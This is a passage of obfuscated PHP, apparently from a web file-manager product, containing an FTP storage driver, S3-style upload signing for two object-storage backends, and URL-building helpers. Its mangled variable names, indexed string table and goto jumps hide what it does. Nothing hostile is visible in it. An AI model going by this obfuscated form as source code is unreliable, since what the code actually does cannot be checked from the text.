$this->getConfig(); $ĞÛêÍ¤Ş = KOD_VERSION . $²Ã´Ù´è[10] . KOD_VERSION_BUILD; $È´•¥¨ = $this->packageVersion(); $ƒóÎøŒ÷ = $ĞÛêÍ¤Ş . $²Ã´Ù´è[462] . $È´•¥¨; if (substr($™¶­¥Í÷, 0, 4) == $²Ã´Ù´è[152] || substr($™¶­¥Í÷, 0, 2) == $²Ã´Ù´è[1410]) { $ôËÓ·Ÿ› = $™¶­¥Í÷ . $²Ã´Ù´è[1692] . $ƒóÎøŒ÷; } else { if ($Ü ç»¾º == $²Ã´Ù´è[12]) { $ôËÓ·Ÿ› = $this->pluginHost . $™¶­¥Í÷ . $²Ã´Ù´è[1692] . $ƒóÎøŒ÷; } else { if ($Ü ç»¾º === $²Ã´Ù´è[78]) { $ôËÓ·Ÿ› = $this->pluginHost . $™¶­¥Í÷; } else { if ($Ü ç»¾º == $²Ã´Ù´è[1693]) { $ôËÓ·Ÿ› = STATIC_PATH . $™¶­¥Í÷ . $²Ã´Ù´è[1692] . $ĞÛêÍ¤Ş; } else { if ($Ü ç»¾º == $²Ã´Ù´è[1694]) { $ôËÓ·Ÿ› = APP_HOST . $²Ã´Ù´è[1695] . $™¶­¥Í÷ . $²Ã´Ù´è[1692] . $ĞÛêÍ¤Ş; } else { if (isset($óŒ¼’ÌÆ[$Ü ç»¾º])) { $ôËÓ·Ÿ› = $óŒ¼’ÌÆ[$Ü ç»¾º] . $™¶­¥Í÷ . $²Ã´Ù´è[1692] . $ƒóÎøŒ÷; } } } } } } if (!$¥ŠòĞë) { return $ôËÓ·Ÿ›; } echo $ôËÓ·Ÿ›; } public function link($›‚íˆÓ† = false, $ÜÊÆí–î = '') { $Ğ¼Åãƒ =& $_SERVER[¦»×‡Ãã]; $‰èÇ™½— = $this->linkHas == !1; $this->linkHas = !0; if (!$›‚íˆÓ†) { $this->link($Ğ¼Åãƒ[1696], $Ğ¼Åãƒ[1694]); $this->link($Ğ¼Åãƒ[1697], $Ğ¼Åãƒ[1693]); $this->link($Ğ¼Åãƒ[1698], $Ğ¼Åãƒ[1693]); $this->link($Ğ¼Åãƒ[1699], $Ğ¼Åãƒ[1693]); $this->link($Ğ¼Åãƒ[1700], $Ğ¼Åãƒ[1693]); if ($‰èÇ™½—) { Hook::trigger($Ğ¼Åãƒ[1701]); } return; } $²ª¯™Ï = $this->url($›‚íˆÓ†, $ÜÊÆí–î, !1); if (substr($›‚íˆÓ†, -3) == $Ğ¼Åãƒ[1702]) { echo $Ğ¼Åãƒ[1703] . $²ª¯™Ï . $Ğ¼Åãƒ[1704] . $Ğ¼Åãƒ[262]; } else { if (substr($›‚íˆÓ†, -4) == $Ğ¼Åãƒ[1705]) { echo $Ğ¼Åãƒ[1706] . $²ª¯™Ï . $Ğ¼Åãƒ[1707] . $Ğ¼Åãƒ[262]; } } if ($‰èÇ™½—) { Hook::trigger($Ğ¼Åãƒ[1701]); } } } goto B¦—ìÇ±Ô; dÖ”ªÕÉºí: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‰ˆ´«†) { parent::__construct($‰ˆ´«†); $this->setSignVersion($_SERVER[¦»×‡Ãã][247]); } public function uploadFormData($¦âÔ¤Á¯, $çÂ‰Ï„Ñ = 3600) { $ä‘ıËßœ =& $_SERVER[¦»×‡Ãã]; $Í²õœãî = $ä‘ıËßœ[229]; $¡€¤Úã” = $ä‘ıËßœ[270]; $ÏÅí÷­ß = $ä‘ıËßœ[62]; $£½Şúìë = gmdate($ä‘ıËßœ[271]); $’ªœ³™¸ = gmdate($ä‘ıËßœ[272]); $ÁçÄ…œ· = $ä‘ıËßœ[273]; $—»¹â©Š = $çÂ‰Ï„Ñ . $ä‘ıËßœ[12]; $Ù·Ë–ÅÒ = $ä‘ıËßœ[274]; $’·ŸæÖÔ = array($this->accessKey, $’ªœ³™¸, $this->region, $ÏÅí÷­ß, $ÁçÄ…œ·); $Úùü±‰ = implode($ä‘ıËßœ[8], $’·ŸæÖÔ); $´È–èÅ° = array($ä‘ıËßœ[275] => gmdate($ä‘ıËßœ[299], strtotime($ä‘ıËßœ[277])), $ä‘ıËßœ[278] => array(array($ä‘ıËßœ[279] => $this->bucket), array($ä‘ıËßœ[280] => $Í²õœãî), array($ä‘ıËßœ[281], $ä‘ıËßœ[282], $ä‘ıËßœ[12]), array($ä‘ıËßœ[281], $ä‘ıËßœ[283], $ä‘ıËßœ[12]), array($ä‘ıËßœ[281], $ä‘ıËßœ[284], $ä‘ıËßœ[12]), array($ä‘ıËßœ[285] => $Ù·Ë–ÅÒ), array($ä‘ıËßœ[286] => $Úùü±‰), array($ä‘ıËßœ[287] => $¡€¤Úã”), array($ä‘ıËßœ[288] => $£½Şúìë), array($ä‘ıËßœ[289] => $—»¹â©Š))); $•Ş’”Æ = base64_encode(json_encode($´È–èÅ°)); $åì³á¢¿ = hash_hmac($ä‘ıËßœ[290], $’ªœ³™¸, $ä‘ıËßœ[291] . $this->secret, !0); $å³Ãıûñ = hash_hmac($ä‘ıËßœ[290], $this->region, $åì³á¢¿, !0); $°¶›£‚Ñ = hash_hmac($ä‘ıËßœ[290], $ÏÅí÷­ß, $å³Ãıûñ, !0); $¥¿ãßÂÉ = hash_hmac($ä‘ıËßœ[290], $ÁçÄ…œ·, $°¶›£‚Ñ, !0); $åØ¬á†æ = hash_hmac($ä‘ıËßœ[290], $•Ş’”Æ, $¥¿ãßÂÉ); $¤œ›¬Ê‡ = array($ä‘ıËßœ[246] => $ä‘ıËßœ[12], $ä‘ıËßœ[292] => $ä‘ıËßœ[12], $ä‘ıËßœ[280] => $Í²õœãî, $ä‘ıËßœ[285] => $Ù·Ë–ÅÒ, $ä‘ıËßœ[293] => $•Ş’”Æ, $ä‘ıËßœ[294] => $Úùü±‰, $ä‘ıËßœ[295] => $¡€¤Úã”, $ä‘ıËßœ[296] => $£½Şúìë, $ä‘ıËßœ[297] => $—»¹â©Š, $ä‘ıËßœ[298] => $åØ¬á†æ, $ä‘ıËßœ[208] => $this->getHost()); return $¤œ›¬Ê‡; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($À¦Æ÷½™) { parent::__construct(); if (count($À¦Æ÷½™) > 0) { $this->_init($À¦Æ÷½™); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ì£æÇ¹ù) { $—ù–µ€Ù =& $_SERVER[¦»×‡Ãã]; global $config; $this->appCharset = $config[$—ù–µ€Ù[1438]]; $this->systemCharset = $config[$—ù–µ€Ù[1439]]; if (isset($ì£æÇ¹ù[$—ù–µ€Ù[1440]]) && $ì£æÇ¹ù[$—ù–µ€Ù[1440]]) { $this->systemCharset = $ì£æÇ¹ù[$—ù–µ€Ù[1440]]; } } public function iconvApp($¥½èƒ­à) { return $this->iconvTo($¥½èƒ­à, $this->systemCharset, $this->appCharset); } public function iconvSystem($ö¹éüı™) { return $this->iconvTo($ö¹éüı™, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ìõ±öÈ«) { $¿°ÕÌóç =& $_SERVER[¦»×‡Ãã]; $²ÑÀ¹¶„ = $this->iconvApp($this->pathBase); $Ìõ±öÈ« = $this->iconvApp($Ìõ±öÈ«); if (substr($²ÑÀ¹¶„, 0, 2) == $¿°ÕÌóç[1410]) { $²ÑÀ¹¶„ = BASIC_PATH . substr($²ÑÀ¹¶„, 2); } if (substr($Ìõ±öÈ«, 0, 2) == $¿°ÕÌóç[1410]) { $Ìõ±öÈ« = BASIC_PATH . substr($Ìõ±öÈ«, 2); } $²ÑÀ¹¶„ = KodIO::clear($²ÑÀ¹¶„); $Ìõ±öÈ« = KodIO::clear($Ìõ±öÈ«); $Ìõ±öÈ« = substr($Ìõ±öÈ«, strlen($²ÑÀ¹¶„)); if (empty($this->pathDriver)) { return $Ìõ±öÈ«; } return $this->pathDriver . $¿°ÕÌóç[8] . ltrim($Ìõ±öÈ«, $¿°ÕÌóç[8]); } private function _init($Ÿ®ì¥ç… = array()) { $½Ÿ¿Çß =& $_SERVER[¦»×‡Ãã]; if (!function_exists($½Ÿ¿Çß[1441])) { throw new Exception(LNG($½Ÿ¿Çß[1442])); } $this->config = $Ÿ®ì¥ç…; $this->charsetReset($Ÿ®ì¥ç…); foreach ($Ÿ®ì¥ç… as $…ğÚ˜ë‘ => $ºêŒÆÍÕ) { if (isset($this->{$…ğÚ˜ë‘})) { $this->{$…ğÚ˜ë‘} = $ºêŒÆÍÕ; } } return $this->_login($Ÿ®ì¥ç…); } private function _login($õÃï·¯) { $«ê£´êş =& $_SERVER[¦»×‡Ãã]; static $­å–‘ÏÙ = array(); $òè‡ÑÍí = md5(json_encode($õÃï·¯)); if (isset($­å–‘ÏÙ[$òè‡ÑÍí])) { foreach ($­å–‘ÏÙ[$òè‡ÑÍí] as $šçŠ—æµ => $¥ÈâÜ€—) { $this->{$šçŠ—æµ} = $¥ÈâÜ€—; } return !0; } $ºÒà¤Ûú = parse_url(trim($this->server, $«ê£´êş[8])); $this->host = $ºÒà¤Ûú[$«ê£´êş[208]]; $Èä¥¿ÓÂ = isset($ºÒà¤Ûú[$«ê£´êş[207]]) && $ºÒà¤Ûú[$«ê£´êş[207]] == $«ê£´êş[1443] ? !0 : !1; $this->scheme = $Èä¥¿ÓÂ ? $«ê£´êş[1444] : $«ê£´êş[1445]; $this->port = isset($ºÒà¤Ûú[$«ê£´êş[209]]) ? $ºÒà¤Ûú[$«ê£´êş[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($«ê£´êş[1446]) . $this->host . $«ê£´êş[4] . $this->port, !0); return !1; } $§ÁŠø£ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$§ÁŠø£) { $this->writeLog(LNG($«ê£´êş[1447]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¡†¥“¯ı = $this->pasv == $«ê£´êş[91] ? !0 : !1; @ftp_pasv($this->connect, $¡†¥“¯ı); $­å–‘ÏÙ[$òè‡ÑÍí] = array($«ê£´êş[1448] => $this->connect, $«ê£´êş[208] => $this->host, $«ê£´êş[207] => $this->scheme, $«ê£´êş[209] => $this->port); return $§ÁŠø£; } private function _isconn($–—¯ÂŸû = true) { if (is_resource($this->connect)) { return !0; } if (!$–—¯ÂŸû) { return !1; } return $this->_login($this->config); } public function mkfile($Ì‡ã´œÓ, $¬€¿ÈÚ = '', $·ˆà¦ûÆ = REPEAT_RENAME) { if ($this->setContent($Ì‡ã´œÓ, $¬€¿ÈÚ)) { return $this->getPathOuter($Ì‡ã´œÓ); } $this->writeLog(LNG($_SERVER[¦»×‡Ãã][1449]), !0); return !1; } public function mkdir($®íÃæ¦, $—°ˆ§®â = REPEAT_SKIP) { $â‰¡é£ú =& $_SERVER[¦»×‡Ãã]; if (!$®íÃæ¦ || $®íÃæ¦ == $â‰¡é£ú[8]) { return !0; } if (!$this->_isconn()) { return !1; } $®íÃæ¦ = $this->iconvSystem($®íÃæ¦); if ($this->_isFolder($®íÃæ¦) || @ftp_mkdir($this->connect, $®íÃæ¦)) { return $this->getPathOuter($®íÃæ¦); } if (!$this->mkdir($this->pathFather($®íÃæ¦))) { return !1; } if ($®íÃæ¦ = @ftp_mkdir($this->connect, $®íÃæ¦)) { return $this->getPathOuter($®íÃæ¦); } $this->writeLog(__FUNCTION__ . $â‰¡é£ú[1450], !0); return !1; } public function copyFile($®ĞşÔú¼, $èÚÜŒ˜ï) { if (!$this->_isconn()) { return !1; } $£Ï¿ƒ±Ë = $this->pathThis($this->iconvSystem($®ĞşÔú¼)); $¤â¬–Ê = $this->tempFile($£Ï¿ƒ±Ë); $Ü¤£»Àè = $this->iconvApp($¤â¬–Ê); $this->download($®ĞşÔú¼, $Ü¤£»Àè); $”ÍâıéÙ = $this->upload($èÚÜŒ˜ï, $Ü¤£»Àè); $this->tempFileRemve($¤â¬–Ê); return $”ÍâıéÙ; } public function moveFile($Û¸÷ü«ì, $ÃÈØíìƒ) { if (!$this->_isconn()) { return !1; } $Û¸÷ü«ì = $this->iconvSystem($Û¸÷ü«ì); $ÃÈØíìƒ = $this->iconvSystem($ÃÈØíìƒ); $€ßïµÔø = @ftp_rename($this->connect, $Û¸÷ü«ì, $ÃÈØíìƒ); if (!$€ßïµÔø) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); return !1; } return $this->getPathOuter($ÃÈØíìƒ); } public function delFile($ó­‹ùŠ®) { if (!$this->_isconn()) { return !1; } $ó­‹ùŠ® = $this->iconvSystem($ó­‹ùŠ®); $‰û›­Üø = @ftp_delete($this->connect, $ó­‹ùŠ®); if (!$‰û›­Üø) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); } return $‰û›­Üø; } public function delFolder($ºš»ĞËè) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ õÕğº‡ = $¾ó³×Ìô = array(); $this->fileList($ºš»ĞËè, $ õÕğº‡, $¾ó³×Ìô, !0); $this->listItemCache = !0; foreach ($¾ó³×Ìô as $Èî»Ô†ê) { $éû©ë = $this->iconvSystem($Èî»Ô†ê[$_SERVER[¦»×‡Ãã][32]]); $Şâó«ÖÍ = @ftp_delete($this->connect, $éû©ë); if (!$Şâó«ÖÍ) { return !1; } } foreach ($ õÕğº‡ as $éû©ë) { $éû©ë = $this->iconvSystem($éû©ë); $Şâó«ÖÍ = @ftp_rmdir($this->connect, $éû©ë); if (!$Şâó«ÖÍ) { return !1; } } $ºš»ĞËè = $this->iconvSystem($ºš»ĞËè); return @ftp_rmdir($this->connect, $ºš»ĞËè); } public function rename($£æ¸æ—ƒ, $ÇĞ¨±¬Î) { $ÆÑİºÌò =& $_SERVER[¦»×‡Ãã]; if (!$this->_isconn()) { return !1; } $ÎÛîˆŞû = $this->fileNameAuto($this->pathFather($£æ¸æ—ƒ), $ÇĞ¨±¬Î); $ÎÛîˆŞû = $this->iconvSystem($ÎÛîˆŞû); $£æ¸æ—ƒ = $this->iconvSystem($£æ¸æ—ƒ); $İŞ«ô¸ = $this->pathFather($£æ¸æ—ƒ); $àØß½ÈÆ = rtrim($İŞ«ô¸, $ÆÑİºÌò[8]) . $ÆÑİºÌò[8] . $ÎÛîˆŞû; $Äåßâñ  = @ftp_rename($this->connect, $£æ¸æ—ƒ, $àØß½ÈÆ); if (!$Äåßâñ ) { $this->writeLog(__FUNCTION__ . $ÆÑİºÌò[1450], !0); return !1; } $àØß½ÈÆ = $this->iconvApp($àØß½ÈÆ); return $this->getPathOuter($àØß½ÈÆ); } private function folderInfo($®ğèÀ“é, $§ç°¬“… = false) { $Íã´èÚ‘ =& $_SERVER[¦»×‡Ãã]; $çı‚³‹ = array($Íã´èÚ‘[32] => $this->pathThis($®ğèÀ“é), $Íã´èÚ‘[87] => $this->getPathOuter($Íã´èÚ‘[8] . $®ğèÀ“é), $Íã´èÚ‘[33] => $Íã´èÚ‘[78]); if ($§ç°¬“…) { return $çı‚³‹; } $çı‚³‹[$Íã´èÚ‘[231]] = $çı‚³‹[$Íã´èÚ‘[88]] = 0; $çı‚³‹[$Íã´èÚ‘[232]] = $çı‚³‹[$Íã´èÚ‘[233]] = !0; return $çı‚³‹; } private function fileInfo($†”Ş†‹±, $–šè×× = false, $şÚ£¾Á = array()) { $×£ã—â =& $_SERVER[¦»×‡Ãã]; $¼Şí©Æƒ = array($×£ã—â[32] => $this->pathThis($†”Ş†‹±), $×£ã—â[87] => $this->getPathOuter($×£ã—â[8] . $†”Ş†‹±), $×£ã—â[33] => $×£ã—â[230], $×£ã—â[79] => isset($şÚ£¾Á[$×£ã—â[79]]) ? $şÚ£¾Á[$×£ã—â[79]] : 0, $×£ã—â[169] => $this->ext($†”Ş†‹±)); if ($–šè××) { return $¼Şí©Æƒ; } $¼Şí©Æƒ[$×£ã—â[231]] = $¼Şí©Æƒ[$×£ã—â[88]] = 0; $¼Şí©Æƒ[$×£ã—â[232]] = $¼Şí©Æƒ[$×£ã—â[233]] = !0; $Öù…×¿ = $this->iconvSystem($†”Ş†‹±); $¼Şí©Æƒ[$×£ã—â[88]] = @ftp_mdtm($this->connect, $Öù…×¿); if (empty($şÚ£¾Á)) { $şÚ£¾Á = $this->objectMeta($†”Ş†‹±); if (!$şÚ£¾Á) { return $¼Şí©Æƒ; } } $¼Şí©Æƒ[$×£ã—â[79]] = $şÚ£¾Á[$×£ã—â[79]]; return $¼Şí©Æƒ; } public function size($İÕĞÍÒª) { $›³¹ÒéŒ = $this->objectMeta($İÕĞÍÒª); return $›³¹ÒéŒ ? $›³¹ÒéŒ[$_SERVER[¦»×‡Ãã][79]] : 0; } public function info($†úâØÁğ) { if ($this->isFile($†úâØÁğ)) { return $this->fileInfo($†úâØÁğ, 0); } else { if ($this->isFolder($†úâØÁğ)) { return $this->folderInfo($†úâØÁğ); } } return !1; } private function fileList($¯÷ŒöŠê, &$¸Îå’û, &$‚ìıÀş«, $š¡‡¨« = false) { $ Óøªò² =& $_SERVER[¦»×‡Ãã]; $¯÷ŒöŠê = $this->iconvSystem($¯÷ŒöŠê); if (!$this->isFolder($¯÷ŒöŠê)) { return !1; } @ftp_chdir($this->connect, $ Óøªò²[8]); $¯÷ŒöŠê = rtrim($¯÷ŒöŠê, $ Óøªò²[8]) . $ Óøªò²[8]; check_abort(); $²ˆóâ”¯ = @ftp_rawlist($this->connect, $¯÷ŒöŠê); if (!$²ˆóâ”¯) { $²ˆóâ”¯ = array(); } $ğŸ™Àƒï = array($ Óøªò²[10] => 1, $ Óøªò²[1363] => 1); foreach ($²ˆóâ”¯ as $Ç¸ ì®À) { $Èã·íş¢ = $this->_listItem($Ç¸ ì®À); if ($Èã·íş¢[0] == $ Óøªò²[831]) { continue; } $Ê õ˜ = $Èã·íş¢[8]; if (empty($Ê õ˜) && $Ê õ˜ !== $ Óøªò²[228] || isset($ğŸ™Àƒï[$Ê õ˜])) { continue; } $Ê õ˜ = $this->iconvApp($¯÷ŒöŠê . ltrim($Ê õ˜, $ Óøªò²[8])); $ôÄ«„Ÿ³ = array($ Óøªò²[32] => $Ê õ˜, $ Óøªò²[33] => $ Óøªò²[230], $ Óøªò²[79] => $Èã·íş¢[4]); if (substr($Ç¸ ì®À, 0, 1) == $ Óøªò²[1451]) { $ôÄ«„Ÿ³[$ Óøªò²[33]] = $ Óøªò²[78]; $ôÄ«„Ÿ³[$ Óøªò²[79]] = 0; } $½ŸÃÀÎè = $ôÄ«„Ÿ³[$ Óøªò²[33]] == $ Óøªò²[78] ? !0 : !1; $this->cacheMethodInfoSet($Ê õ˜, $½ŸÃÀÎè, $ôÄ«„Ÿ³); if ($½ŸÃÀÎè) { $¸Îå’û[] = $Ê õ˜; if ($š¡‡¨«) { $this->fileList($Ê õ˜, $¸Îå’û, $‚ìıÀş«, $š¡‡¨«); } continue; } $‚ìıÀş«[] = $ôÄ«„Ÿ³; } $this->cacheMethodInfoSet($¯÷ŒöŠê, !0); } private function _listItem($¸´é¡«½) { if (empty($¸´é¡«½)) { return array(); } $ö÷¾í½Æ = preg_split($_SERVER[¦»×‡Ãã][1452], $¸´é¡«½); if (count($ö÷¾í½Æ) <= 9) { return $ö÷¾í½Æ; } $ö÷¾í½Æ[8] = trim(substr($¸´é¡«½, strpos($¸´é¡«½, $ö÷¾í½Æ[7]) + strlen($ö÷¾í½Æ[7]))); return array_splice($ö÷¾í½Æ, 0, 9); } public function listPath($ª•—µÅ·, $ä ›ß‰ä = false) { $ÄÄ€—æ =& $_SERVER[¦»×‡Ãã]; if (!$this->_isconn()) { return !1; } $ıÜÏÄ„Ê = $¸‡ †ªœ = array(); $this->fileList($ª•—µÅ·, $ıÜÏÄ„Ê, $¸‡ †ªœ); foreach ($ıÜÏÄ„Ê as $ºŸÖã´• => $Ôö²âÏ¢) { $ıÜÏÄ„Ê[$ºŸÖã´•] = $this->folderInfo($Ôö²âÏ¢, $ä ›ß‰ä); } foreach ($¸‡ †ªœ as $ºŸÖã´• => $Ôö²âÏ¢) { $¸‡ †ªœ[$ºŸÖã´•] = $this->fileInfo($Ôö²âÏ¢[$ÄÄ€—æ[32]], $ä ›ß‰ä, $Ôö²âÏ¢); } return array($ÄÄ€—æ[85] => $ıÜÏÄ„Ê, $ÄÄ€—æ[86] => $¸‡ †ªœ); } public function has($óşƒ“°, $È¥€¥Ç§ = false, $ÕªéĞò± = true) { $¼Ğõ¿Ø› =& $_SERVER[¦»×‡Ãã]; $åéï¢’× = $•”¼Ï = array(); $°û©§®Û = $È¥€¥Ç§ ? !0 : !1; $this->fileList($óşƒ“°, $åéï¢’×, $•”¼Ï, $°û©§®Û); if ($È¥€¥Ç§) { return array($¼Ğõ¿Ø›[239] => count($•”¼Ï), $¼Ğõ¿Ø›[240] => count($åéï¢’×)); } if ($ÕªéĞò±) { if (count($•”¼Ï)) { return !0; } } else { if (count($åéï¢’×)) { return !0; } } return !1; } public function listAll($š„ñÔµ¤) { $è°¨¹“€ =& $_SERVER[¦»×‡Ãã]; if (!$this->_isconn()) { return !1; } $×÷Ò·ë = $ß¦İ•èÇ = array(); $this->fileList($š„ñÔµ¤, $×÷Ò·ë, $ß¦İ•èÇ, !0); $££ı²¡ = array_to_keyvalue($ß¦İ•èÇ, $è°¨¹“€[32]); foreach ($×÷Ò·ë as $ú¾Ëˆ÷Ö) { if (is_string($ú¾Ëˆ÷Ö)) { $££ı²¡[$ú¾Ëˆ÷Ö] = array($è°¨¹“€[79] => 0); } } return $this->listAllFiles($š„ñÔµ¤, $££ı²¡); } public function getContent($¨Áº˜š£) { if (!$this->_isconn()) { return !1; } $¨Áº˜š£ = $this->iconvSystem($¨Áº˜š£); return $this->fileSubstr($¨Áº˜š£); } public function setContent($”åšû‡ê, $Ú®òö¥ = '') { if (!$this->_isconn()) { return !1; } $Á…µÍ = $this->pathThis($this->iconvSystem($”åšû‡ê)); $Œñ¯¾ïÌ = $this->tempFile($Á…µÍ); file_put_contents($Œñ¯¾ïÌ, $Ú®òö¥); $ŞÉœàğ¾ = $this->upload($”åšû‡ê, $this->iconvApp($Œñ¯¾ïÌ)); $this->tempFileRemve($Œñ¯¾ïÌ); return $ŞÉœàğ¾; } public function fileSubstr($ìúÛ§ê, $øœÓÙËø = 0, $èš…Í©ì = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ìúÛ§ê, $øœÓÙËø, $èš…Í©ì); } private function ftpRequest($½ ‹·„ˆ, $ïõÁ–±½ = 0, $«ÊãÜû = false) { $½ ‹·„ˆ = $this->iconvSystem($½ ‹·„ˆ); $¤µ±î = $this->scheme . $this->host . $_SERVER[¦»×‡Ãã][4] . $this->port; $¾Øğß = curl_init(); curl_setopt($¾Øğß, CURLOPT_URL, $¤µ±î . $this->pathEncode($½ ‹·„ˆ)); curl_setopt($¾Øğß, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($«ÊãÜû) { $µ„Û§õ = $ïõÁ–±½ + $«ÊãÜû - 1; curl_setopt($¾Øğß, CURLOPT_RANGE, "{$ïõÁ–±½}\x2d{$µ„Û§õ}"); } curl_setopt($¾Øğß, CURLOPT_RETURNTRANSFER, 1); $Æ‘¾ÀØ§ = curl_exec($¾Øğß); curl_close($¾Øğß); return $Æ‘¾ÀØ§; } public function upload($ŠæãáÍ, $É½¡ç’ò, $½¨ó¯ëå = false, $Íï °Í = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ŠæãáÍ))) { return !1; } $ŠæãáÍ = $this->iconvSystem($ŠæãáÍ); $É½¡ç’ò = $this->iconvSystem($É½¡ç’ò); $óµóßÀ = ftp_nb_put($this->connect, $ŠæãáÍ, $É½¡ç’ò, FTP_BINARY); while ($óµóßÀ == FTP_MOREDATA) { $óµóßÀ = ftp_nb_continue($this->connect); } if ($óµóßÀ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); return !1; } return $this->getPathOuter($ŠæãáÍ); } public function download($×­ı ˆº, $òå«¾Î‹ = '') { if (!$this->_isconn()) { return !1; } $İ²Ëèì„ = $this->pathFather($òå«¾Î‹); if (!IO::mkdir($İ²Ëèì„)) { return !1; } $×­ı ˆº = $this->iconvSystem($×­ı ˆº); $òå«¾Î‹ = $this->iconvSystem($òå«¾Î‹); $ãŞµ²»„ = ftp_nb_get($this->connect, $òå«¾Î‹, $×­ı ˆº, FTP_BINARY); while ($ãŞµ²»„ == FTP_MOREDATA) { $ãŞµ²»„ = ftp_nb_continue($this->connect); } if ($ãŞµ²»„ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][1450], !0); return !1; } return $this->iconvApp($òå«¾Î‹); } public function exist($Ü³„ôç°) { return $this->isFile($Ü³„ôç°) || $this->isFolder($Ü³„ôç°); } public function isFile($ôÔ†Ù–“) { return !$this->isFolder($ôÔ†Ù–“) && $this->objectMeta($ôÔ†Ù–“); } public function isFolder($¥–Š½§) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][179], $¥–Š½§); } protected function objectMeta($ÈÜĞ—×ß) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][181], $ÈÜĞ—×ß); } protected function _objectMeta($©Í„ˆ ) { $úÌŸûÑ =& $_SERVER[¦»×‡Ãã]; if ($©Í„ˆ  == $úÌŸûÑ[12] || $©Í„ˆ  == $úÌŸûÑ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $©Í„ˆ  = $this->iconvSystem($©Í„ˆ ); $áĞôšò¶ = array($úÌŸûÑ[32] => $this->iconvApp($©Í„ˆ ), $úÌŸûÑ[33] => $úÌŸûÑ[230], $úÌŸûÑ[79] => 0); @ftp_chdir($this->connect, $úÌŸûÑ[8]); $è¦›¼ê = @ftp_size($this->connect, $©Í„ˆ ); if ($è¦›¼ê != -1) { $áĞôšò¶[$úÌŸûÑ[79]] = $è¦›¼ê; } else { $´ìñ ÍØ = @ftp_chdir($this->connect, $©Í„ˆ ); if (!$´ìñ ÍØ) { return !1; } $áĞôšò¶[$úÌŸûÑ[33]] = $úÌŸûÑ[78]; } return $áĞôšò¶; } protected function _isFolder($‚ëÍ„¥) { $£ œ£öĞ =& $_SERVER[¦»×‡Ãã]; if ($‚ëÍ„¥ == $£ œ£öĞ[12] || $‚ëÍ„¥ == $£ œ£öĞ[8]) { return !0; } $­î²„î = $this->_objectMeta($‚ëÍ„¥); return isset($­î²„î[$£ œ£öĞ[33]]) && $­î²„î[$£ œ£öĞ[33]] == $£ œ£öĞ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($–€¡ö¼) { parent::__construct($–€¡ö¼); $this->setSignVersion($_SERVER[¦»×‡Ãã][247]); } public function uploadLink($¡Œ¯÷Ñ², $¼ª‹ –ö = 0) { $ğá­ö¯Ê =& $_SERVER[¦»×‡Ãã]; if ($this->isUploadServer()) { return; } $Ô¤€ªˆô = $this->getType(); if (!in_array($Ô¤€ªˆô, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÃƒÅÚÎ³ = (!$¼ª‹ –ö ? 1 : ceil($¼ª‹ –ö / pow(1024, 3))) * 3600 * 4; $³çó•Âê = $this->multiUploadFormData($¡Œ¯÷Ñ², $ÃƒÅÚÎ³); if ($³çó•Âê) { $³çó•Âê[$ğá­ö¯Ê[97]] = $¡Œ¯÷Ñ²; $³çó•Âê[$ğá­ö¯Ê[98]] = $Ô¤€ªˆô; } return $³çó•Âê; } public function fileOutImage($œ¨ãïÄ, $ÀïšÈ‡İ = 250) { if ($this->size($œ¨ãïÄ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($œ¨ãïÄ, $ÀïšÈ‡İ); } $©»éíû = $this->link($œ¨ãïÄ); $©»éíû .= $_SERVER[¦»×‡Ãã][1453] . $ÀïšÈ‡İ; $this->fileOutLink($©»éíû); } public function fileOutLink($ûÆ¡šöñ) { $Ê€ßĞÍ =& $_SERVER[¦»×‡Ãã]; if (substr($ûÆ¡šöñ, 0, 7) == $Ê€ßĞÍ[313]) { $ûÆ¡šöñ = $Ê€ßĞÍ[314] . substr($ûÆ¡šöñ, 7); } header($Ê€ßĞÍ[175] . $ûÆ¡šöñ); die; } } goto B‹¯É²Ïï–; dÁŸ‚»Îáç: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($ÎèÖææ) { $÷ŒÍªÛá =& $_SERVER[¦»×‡Ãã]; return array($÷ŒÍªÛá[2084] => array($ÎèÖææ[0], $÷ŒÍªÛá[2085]), $÷ŒÍªÛá[2086] => array($ÎèÖææ[0], $÷ŒÍªÛá[2087])); } protected function get($¯Œ×–äí) { $™ªÁÄÓå =& $_SERVER[¦»×‡Ãã]; $ÀŠ“ÓÕÚ = Model($™ªÁÄÓå[585])->metaGet($¯Œ×–äí, $™ªÁÄÓå[2088]); $äÎœÖº£ = json_decode($ÀŠ“ÓÕÚ, !0); return $äÎœÖº£ ? $äÎœÖº£ : array($™ªÁÄÓå[2089] => $™ªÁÄÓå[91], $™ªÁÄÓå[445] => array()); } protected function set($”¦Í‰¯, $ÎÚ¨±÷…) { $¤Ñ„ÍŸ =& $_SERVER[¦»×‡Ãã]; $ÎÚ¨±÷… = $ÎÚ¨±÷… ? $ÎÚ¨±÷… : array($¤Ñ„ÍŸ[2089] => $¤Ñ„ÍŸ[91], $¤Ñ„ÍŸ[445] => array()); return Model($¤Ñ„ÍŸ[585])->metaSet($”¦Í‰¯, 